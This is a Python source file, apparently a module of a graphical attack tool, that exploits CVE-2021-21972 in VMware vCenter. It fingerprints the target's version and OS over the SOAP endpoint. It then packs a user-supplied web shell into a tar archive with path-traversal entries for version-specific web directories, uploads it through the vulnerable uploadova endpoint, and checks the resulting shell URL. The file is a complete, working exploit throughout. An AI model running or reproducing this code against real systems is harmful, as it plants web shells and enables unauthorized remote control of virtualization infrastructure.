import os
import re
import sys
import tarfile
import time

import urllib3
import requests
from utils.output import output_format
from utils.CollectVcenterInfo import VcenterInfo
urllib3.disable_warnings()

class cve_2021_21972_shell_upload:

    def __init__(self, url_text, shell_text, result_text, shell_name_text, update_date):
        _url = str(url_text.text())
        if _url.endswith("/"):
            self.url = _url[:-1]
        else:
            self.url = _url
        self.shell_content = str(shell_text.toPlainText())
        self.result_text = result_text
        self.shell_name = str(shell_name_text.text())
        self.update_date = update_date
        self.tar_name = f"{self.shell_name.split('.')[0]}.tar"
        self.hostname = self.url.replace("http://", "").replace("https://", "").split(':')[0]
        iurl = f"{self.url}/sdk/"
        headers = {
            "Host": self.hostname,
            "Content-Type": "text/xml",
        }
        soap_payload = """<?xml version="1.0" encoding="UTF-8"?>
    <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
       <soap:Header>
          <operationID>00000001-00000001</operationID>
       </soap:Header>
       <soap:Body>
          <RetrieveServiceContent xmlns="urn:internalvim25">
             <_this xsi:type="ManagedObjectReference" type="ServiceInstance">ServiceInstance</_this>
          </RetrieveServiceContent>
       </soap:Body>
    </soap:Envelope>
    """
        try:
            response = requests.post(iurl, headers=headers, data=soap_payload, verify=False, allow_redirects=False)
            response_text = response.text
            if response.status_code == 200:
                if any(word in response_text for word in ['ha-folder-root', 'RetrieveServiceContentResponse']):
                    pattern = r"<name>(.*?)</name>|<version>(.*?)</version>|<build>(.*?)</build>|<osType>(.*?)</osType>|<productLineId>(.*?)</productLineId>|<apiType>(.*?)</apiType>"
                    matches = re.findall(pattern, response_text, re.DOTALL)
                    if matches:
                        data = {
                            "name": None,
                            "version": None,
                            "build": None,
                            "osType": None,
                            "productLineId": None,
                            "apiType": None
                        }
                        for match in matches:
                            for i, group in enumerate(match):
                                if group:
                                    data[list(data.keys())[i]] = group
                        self.version = data["version"]
                        self.build = data["build"]
                        self._os = data["osType"]
                        if "win" in self._os:
                            self.os = "windows"
                        else:
                            self.os = "linux"
        except Exception as e:
            self.os = ""
            self.update_date.emit(output_format("ERROR", f"Failed to get the system's version, build and os type. Please retry. Error message: {str(e)}"))

    def shellcontent2file(self):
        try:
            with open(self.shell_name, "w") as shell_file:
                shell_file.write(self.shell_content)
            shell_file.close()
            return True
        except:
            return False

    def check_if_vuln(self):
        response = requests.get(f"{self.url}/ui/vropspluginui/rest/services/uploadova", verify=False, allow_redirects=False, timeout=30)
        if response.status_code == 405:
            return True
        else:
            False

    def getResourcePath(self):
        try:
            response = requests.get(self.url + '/ui', verify=False, allow_redirects=False, timeout=60)
            return response.text.split('static/')[1].split('/')[0]
        except:
            return ""

    # make the full path to archive to tar
    def make_traversal_path(self, level, _os_, path):
        level = int(level)
        if _os_ == "windows":
            traversal = ".." + "\\"
            fullpath = traversal * level + path
            return fullpath.replace('/', '\\').replace('\\\\', '\\')
        else:
            traversal = ".." + "/"
            fullpath = traversal * level + path
            return fullpath.replace('\\', '/').replace('//', '/')

    def addpath2tar(self, level, path, tarf):
        if self.shellcontent2file():
            try:
                fullpath = self.make_traversal_path(level, self.os, path)
                tarf.add(self.shell_name, fullpath)
            except Exception as e:
                self.update_date.emit(output_format("ERROR", f"Failed to write {self.shell_name} to {self.tar_name} on local filesystem. Error message: {str(e)}"))
        else:
            self.update_date.emit(output_format("ERROR", f"Failed to write the shell content to {self.shell_name}."))

    # check the vcenter version on windows and build then return the common payload paths
    def check_windows_version_and_build_first_stage(self):
        payload_paths = [f"ProgramData/VMware/vCenterServer/data/perfcharts/tc-instance/webapps/statsreport/{self.shell_name}"]
        return payload_paths

    def check_windows_version_and_build_second_stage(self):
        payload_paths = [f"ProgramData/VMware/vCenterServer/runtime/VMwareSTSService/webapps/openidconnect/{self.shell_name}"]
        return payload_paths

    # check the vcenter version on windows and build then return the special payload paths
    def check_windows_version_and_build_third_stage(self):
        payload_paths = []
        if (int(self.version.split('.')[0]) == 6 and int(self.version.split('.')[1]) == 7):
            payload_paths.append(f"ProgramData/VMware/vCenterServer/runtime/vsphere-client/server/work/deployer/s/global/29/container-app-war.war/{self.shell_name}")
        elif (int(self.version.split('.')[0]) == 6 and int(self.version.split('.')[1]) == 5):
            payload_paths.append(f"ProgramData/VMware/vCenterServer/runtime/vsphere-client/server/work/deployer/s/global/27/0/container-app-war-6.1.0.war/{self.shell_name}")
        return payload_paths

    # check the vcenter version on windows and build then return the payload paths
    def check_unix_version_and_build(self):
        if(int(self.version.split('.')[0]) == 6 and int(self.version.split('.')[1]) == 5) or (int(self.version.split('.')[0]) == 6 and int(self.version.split('.')[1]) == 7 and int(self.build) < 13010631):
            payload_paths = []
            for random_id in range(112):
                payload_paths.append(f"usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/{random_id}/0/h5ngc.war/resources/{self.shell_name}")
            return payload_paths
        elif(int(self.version.split('.')[0]) == 6 and int(self.version.split('.')[1]) == 7 and int(self.build) >= 13010631):
            payload_paths = []
            payload_paths.append(f"usr/lib/vmware-vsphere-ui/server/static/resources/libs/{self.shell_name}")
            return payload_paths
        elif(int(self.version.split('.')[0]) == 7 and int(self.version.split('.')[1]) == 0):
            payload_paths = []
            source_path = self.getResourcePath()
            if source_path != "":
                payload_paths.append(f"usr/lib/vmware-vsphere-ui/server/static/{source_path}/libs/{self.shell_name}")
                return payload_paths
            else:
                self.update_date.emit(output_format("ERROR", f"Failed to fetch ResourcePath. This is most likely a network issue. Please check your network and try exploiting again."))
                return []
        else:
            return []

    def archive_allpath_to_tar(self, payload_paths):
        self.update_date.emit(output_format("INFO", f"Start writing {self.shell_name} to {self.tar_name} on local filesystem ..."))
        tarf = tarfile.open(self.tar_name, 'w')
        if self.os == "windows":
            for path in payload_paths:
                self.addpath2tar(5, path, tarf)
        else:
            tarf = tarfile.open(self.tar_name, 'w')
            for path in payload_paths:
                self.addpath2tar(2, path, tarf)
        tarf.close()
        self.update_date.emit(output_format("SUCCESS", f"Wrote {self.shell_name} to {self.tar_name} on local filesystem successfully!"))

    def upload_shell_tar(self):
        response = requests.post(f"{self.url}/ui/vropspluginui/rest/services/uploadova", files={'uploadFile': open(self.tar_name, "rb")}, verify=False, allow_redirects=False, timeout=30)
        if response.status_code == 200 and response.text == 'SUCCESS':
            return True
        else:
            return False

    def check_shell(self, shell_url):
        time.sleep(5)
        try:
            re = requests.get(shell_url, verify=False, allow_redirects=False, timeout=20)
            if re.status_code == 200:
                return "200"
            elif re.status_code ==401:
                return "401"
            else:
                return "error"
        except:
            return "error"

    def delete_tar(self):
        if os.path.isfile(self.shell_name):
            os.remove(self.shell_name)
        else:
            pass
        if os.path.isfile(self.tar_name):
            os.remove(self.tar_name)
        else:
            pass

    def upload_and_check_shell_task_manager(self):
        if self.os == "windows":
            self.update_date.emit(output_format("INFO", f"Start using the first payload to upload {self.shell_name}..."))
            first_payload_paths = self.check_windows_version_and_build_first_stage()
            self.archive_allpath_to_tar(first_payload_paths)
            if self.upload_shell_tar():
                shell_check_result = self.check_shell(f"{self.url}/statsreport/{self.shell_name}")
                if shell_check_result == "200":
                    self.update_date.emit(output_format("SUCCESS", f"{self.shell_name} has been uploaded successfully! Shell URL: {self.url}/statsreport/{self.shell_name}"))
                elif shell_check_result == "401":
                    self.update_date.emit(output_format("INFO", f"{self.shell_name} has been uploaded successfully, but you do not have permission to access it. The program will try to use the <second> payload, please wait for a while..."))
                    self.delete_tar()
                    second_payload_paths = self.check_windows_version_and_build_second_stage()
                    self.archive_allpath_to_tar(second_payload_paths)
                    if self.upload_shell_tar():
                        shell_check_result_second = self.check_shell(f"{self.url}/openidconnect/{self.shell_name}")
                        if shell_check_result_second == "200":
                            self.update_date.emit(output_format("SUCCESS", f"{self.shell_name} has been uploaded successfully! Shell URL: {self.url}/openidconnect/{self.shell_name}"))
                        elif shell_check_result_second == "401":
                            self.update_date.emit(output_format("INFO", f"{self.shell_name} has been uploaded successfully, but you do not have permission to access it. The program will try to use the  --> third <--  payload, please wait for a while..."))
                            self.delete_tar()
                            third_payload_paths = self.check_windows_version_and_build_third_stage()
                            self.archive_allpath_to_tar(third_payload_paths)
                            if self.upload_shell_tar():
                                shell_check_result_third = self.check_shell(f"{self.url}/vsphere-client/{self.shell_name}")
                                if shell_check_result_third == "200":
                                    self.update_date.emit(output_format("SUCCESS", f"{self.shell_name} has been uploaded successfully! Shell URL: {self.url}/vsphere-client/{self.shell_name}"))
                                elif shell_check_result_third == "401":
                                    self.update_date.emit(output_format("INFO", f"{self.shell_name} has been uploaded successfully, but all payloads have been tested and the uploaded files are inaccessible due to insufficient permissions. Please try manual exploitation."))
                else:
                    self.update_date.emit(output_format("ERROR",f"{self.shell_name} has been uploaded successfully. However, due to network fluctuations and other reasons, the program is unable to detect whether the shell can be accessed. Please check manually."))
            else:
                self.update_date.emit(output_format("FAILED", f"Failed to upload {self.shell_name}. Maybe you can try manual exploitation."))
        elif self.os == "linux":
            self.update_date.emit(output_format("INFO", f"Start to upload {self.shell_name}..."))
            payloads_path = self.check_unix_version_and_build()
            self.archive_allpath_to_tar(payloads_path)
            if self.upload_shell_tar():
                shell_check_result = self.check_shell(f"{self.url}/ui/resources/{self.shell_name}")
                if shell_check_result == "200":
                    self.update_date.emit(output_format("SUCCESS", f"{self.shell_name} has been uploaded successfully! If your vCenter version is not 6.5 or 6.7 (build < 13010631), please wait for the vCenter system to restart. Shell URL: {self.url}/ui/resources/{self.shell_name}"))
                elif ("error" and "200") not in shell_check_result:
                    self.update_date.emit(output_format("FAILED", f"{self.shell_name} has been uploaded successfully but you don't have permission to access the file. Maybe you can attempt manual exploitation."))
                elif "error" in shell_check_result:
                    self.update_date.emit(output_format("ERROR",f"{self.shell_name} failed to be uploaded. Please check your network and try again, or attempt manual exploitation."))
            else:
                self.update_date.emit(output_format("FAILED", f"Failed to upload {self.shell_name}. Maybe you can try manual exploitation."))
        else:
            self.update_date.emit(output_format("ERROR", "Unable to retrieve system information, possibly due to sluggish system response. Please attempt manual exploitation!"))
        self.delete_tar()